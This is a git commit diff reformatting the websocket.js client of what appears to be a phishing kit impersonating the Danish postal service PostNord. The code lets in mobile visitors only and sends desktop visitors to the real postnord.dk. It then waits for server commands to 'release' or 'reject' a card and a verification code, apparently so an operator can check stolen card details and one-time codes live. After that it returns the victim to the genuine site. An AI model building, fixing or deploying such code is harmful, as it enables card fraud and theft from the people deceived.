60fe37f866e41a6b990a6787cf8d934e5c8424d7
卢德坤 <1364978779@qq.com>
2023-03-24 22:58:41 +0800

    init

--- src/main/resources/static/js/websocket.js
+++ src/main/resources/static/js/websocket.js
@@ -1,10 +1,10 @@
 /*
- * @Descripttion: 
- * @version: 
+ * @Description:
+ * @version:
  * @Author: dekun lu
  * @Date: 2023-02-19 23:39:35
  * @LastEditors: dekun lu
- * @LastEditTime: 2023-03-04 02:21:05
+ * @LastEditTime: 2023-03-04 17:50:03
  */
 
 /**
@@ -15,126 +15,130 @@
 
 const API_URL = window.location.origin;
 
-const WS_URL = window.location.origin.replace("http", "ws");
+//端口号
+const port = 8080;
 
+//域名
+const HOST = window.location.host;
+
+// ws的协议头
+const WS_URL_HEADER = window.location.protocol == "https:" ? "wss:" : "ws:";
 
 //loading    loading-icegif-1.gif
 var loading = document.createElement("div");
 window.onload = async function () {
-    //手机端校验
+  //手机端校验
 
-    const data = fetch(`${API_URL}/user/check`, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-    });
-    const res = await data;
-    const result = await res.json();
-    if (result.code !== 200) {
-        alert("请在手机端打开");
-        //跳转baidu
-        window.location.href = "https://www.postnord.dk";
-        return;
-    }
+  const data = fetch(`${API_URL}/user/check`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+  });
+  const res = await data;
+  const result = await res.json();
+  if (result.code !== 200) {
+    alert("请在手机端打开");
+    //跳转baidu
+    window.location.href = "https://www.postnord.dk";
+    return;
+  }
 
+  //判断localStorage中是否有uid
+  if (sessionStorage.getItem("uid") == null) {
+    //随机生成uid
+    let uid = Math.floor(Math.random() * 1000000000);
+    //将uid存入localStorage
+    sessionStorage.setItem("uid", uid);
 
-    //判断localStorage中是否有uid
-    if (sessionStorage.getItem("uid") == null) {
-        //随机生成uid
-        let uid = Math.floor(Math.random() * 1000000000);
-        //将uid存入localStorage
-        sessionStorage.setItem("uid", uid);
+    //跳转index.html
+    window.location.href = "/index.html";
+  }
 
-        //跳转index.html
-        window.location.href = "/index.html";
-    }
-
-    loading.style.display = "none";
-    loading.style.position = "fixed";
-    loading.style.top = "0";
-    loading.style.left = "0";
-    loading.style.width = "100%";
-    loading.style.height = "100%";
-    loading.style.background = "rgba(0,0,0,0.5)";
-    loading.style.zIndex = "9999";
-    loading.innerHTML = `<div style="position: absolute;top: 50%;left: 50%;transform: translate(-50%,-50%);border-radius: 10px;text-align: center;line-height: 100px;font-size: 20px;">
+  loading.style.display = "none";
+  loading.style.position = "fixed";
+  loading.style.top = "0";
+  loading.style.left = "0";
+  loading.style.width = "100%";
+  loading.style.height = "100%";
+  loading.style.background = "rgba(0,0,0,0.5)";
+  loading.style.zIndex = "9999";
+  loading.innerHTML = `<div style="position: absolute;top: 50%;left: 50%;transform: translate(-50%,-50%);border-radius: 10px;text-align: center;line-height: 100px;font-size: 20px;">
         <img src="./img/loading-icegif-1.gif" alt="" style="width: 25px;height: auto;">
     </div > `;
-    document.body.appendChild(loading);
-}
-const ws = new WebSocket(`${WS_URL}/api/websocket/user/` + sessionStorage.getItem("uid"));
-ws.onopen = function () {
+  document.body.appendChild(loading);
+
+  //连接websocket
+  const ws = new WebSocket(
+    `${WS_URL_HEADER}//${HOST}/api/websocket/user/` +
+      sessionStorage.getItem("uid")
+  );
+  ws.onopen = function () {
     console.log("连接成功");
-};
-ws.onmessage = function (event) {
+  };
+  ws.onmessage = function (event) {
     const data = JSON.parse(event.data);
     //放行卡
     if (data.code == 7) {
-        //存sessionStrorage
-        sessionStorage.setItem("data", JSON.stringify(data.data));
-        hideLoading();
-        //跳转code.html
-        window.location.href = "/code.html";
+      //存sessionStrorage
+      sessionStorage.setItem("data", JSON.stringify(data.data));
+      hideLoading();
+      //跳转code.html
+      window.location.href = "/code.html";
     }
 
     //拒绝卡
     if (data.code == 8) {
-        //存sessionStrorage
-        sessionStorage.setItem("data", JSON.stringify(data.data));
-        document.querySelector('.tip').style.display = "block";
-        document.querySelector('#nbsp').value = "";
-        hideLoading();
+      //存sessionStrorage
+      sessionStorage.setItem("data", JSON.stringify(data.data));
+      document.querySelector(".tip").style.display = "block";
+      document.querySelector("#nbsp").value = "";
+      hideLoading();
     }
 
     //放行验证码
     if (data.code == 9) {
-        //存sessionStrorage
-        sessionStorage.setItem("data", JSON.stringify(data.data));
-        hideLoading();
-        //跳转code.html
-        window.location.href = "https://www.postnord.dk";
+      //存sessionStrorage
+      sessionStorage.setItem("data", JSON.stringify(data.data));
+      hideLoading();
+      //跳转code.html
+      window.location.href = "https://www.postnord.dk";
     }
     //拒绝验证码
     if (data.code == 10) {
-        //存sessionStrorage
-        sessionStorage.setItem("data", JSON.stringify(data.data));
-        document.querySelector('.tip').style.display = "block";
+      //存sessionStrorage
+      sessionStorage.setItem("data", JSON.stringify(data.data));
+      document.querySelector(".tip").style.display = "block";
 
-        [...document.querySelectorAll('#code')].map(item => {
-            item.value = "";
-        })
-        hideLoading();
+      [...document.querySelectorAll("#code")].map((item) => {
+        item.value = "";
+      });
+      hideLoading();
     }
     //同步完成
     if (data.code == 11) {
+      window.location.href = "https://www.postnord.dk";
 
-        window.location.href = "https://www.postnord.dk";
-
-        // hideLoading();
+      // hideLoading();
     }
-};
-ws.onclose = function () {
+  };
+  ws.onclose = function () {
     //连接关闭
     alert("The connection is closed, please refresh the page");
-};
-ws.onerror = function () {
+  };
+  ws.onerror = function () {
     alert("Connection error");
-};
-
-
-//发送心跳，30秒一次
-setInterval(function () {
+  };
+  //发送心跳，30秒一次
+  setInterval(function () {
     ws.send("ping");
-}, 30000);
-
-
-
-
+  }, 30000);
+};
 
 function showLoading() {
-    loading.style.display = "block";
+  loading.style.display = "block";
 }
+
 function hideLoading() {
-    loading.style.display = "none";
+  loading.style.display = "none";
 }
